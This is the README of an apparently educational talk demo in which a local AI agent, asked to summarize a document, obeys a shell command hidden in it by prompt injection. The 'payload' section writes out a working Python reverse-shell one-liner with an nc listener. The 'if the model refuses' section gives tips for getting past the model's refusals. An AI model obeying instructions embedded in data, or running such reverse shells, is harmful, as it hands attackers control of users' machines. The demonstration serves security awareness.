# Agent hijack demo (simple, deterministic, fully contained)

The whole talk in twenty lines of output. A tiny AI agent is asked to SUMMARIZE a
document. The document hides one instruction telling the agent to run a shell
command. The agent runs it. To the model, a command in the data is just a command.

## Run it, one command (fully contained)

Everything runs in Docker: Ollama, the model, and the agent. Nothing to install but
Docker.

    docker compose up --build

The first run downloads the model (a few minutes, cached afterward in a Docker
volume), then the agent reads the poisoned document, decides to run the command, the
command runs, the PWNED line prints, and a summary follows.

Re-run the demo any time:

    docker compose run --rm agent

Use a stronger model:

    LLM_MODEL=qwen2.5:7b docker compose up --build

## If you already pulled a model with native Ollama

You pulled one already, so the quickest path is to point the agent container at your
native Ollama (it uses the Mac GPU, so it is faster than the in-container one):

    docker build -t agent-hijack .
    docker run --rm \
      -e LLM_BASE_URL=http://host.docker.internal:11434/v1 \
      -e LLM_MODEL=qwen2.5:7b \
      --add-host=host.docker.internal:host-gateway \
      agent-hijack

Set LLM_MODEL to whatever tag you pulled (check with `ollama list`).

## What AI it uses

A local model served by Ollama, pulled automatically on first run of the compose
file. Default `qwen2.5:3b` (fast); `qwen2.5:7b` follows instructions more reliably;
`llama3.1:8b` also works. All local: no API key, no cloud, offline after the pull.

## Apple Silicon note

Docker on a Mac cannot pass the GPU into Linux containers, so the in-container Ollama
runs on CPU (works, but a 7b model is slow). For the fastest run use native Ollama as
shown above, or keep the default 3b in the compose file.

## Why it is deterministic

`temperature=0` and a fixed seed. Same document, same model, same output every run.

## The payload

The injected command is in `poisoned_doc.txt`, written in the "cognitive override"
style from the research (The Dark Side of LLMs, arXiv:2507.06850). It runs a harmless,
visible `echo "PWNED..."` by default. For a real drop-into-a-shell, start a listener
and swap that one line for a reverse shell:

    nc -lvnp 4444
    # put this in poisoned_doc.txt instead of the echo:
    python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("host.docker.internal",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

## If the model refuses

Small models at temperature 0 usually comply with the embedded instruction. If yours
refuses: use `qwen2.5:7b`, keep the mundane framing, or keep the harmless `echo`
payload, which models run without hesitation. A refusal is itself a talking point.

## Files

    docker-compose.yml   ollama + model + agent, one command
    Dockerfile           the agent image
    entrypoint.sh        waits for ollama, pulls the model, runs the demo
    demo.py              the agent (reads the doc, runs what it is told)
    poisoned_doc.txt     the document with the hidden instruction
    requirements.txt     just the openai client

## The slide line

Capability is not permission. You gave the agent a tool. The document told it what to
do with it.
